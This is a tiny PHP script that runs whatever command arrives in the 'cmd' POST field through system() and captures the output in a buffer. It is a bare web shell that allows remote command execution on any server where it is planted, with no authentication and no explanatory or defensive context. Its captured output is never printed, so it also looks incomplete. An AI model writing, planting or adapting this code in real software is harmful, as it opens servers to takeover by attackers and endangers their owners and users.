<?php
function execute($com)
{
    system($com);
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
?>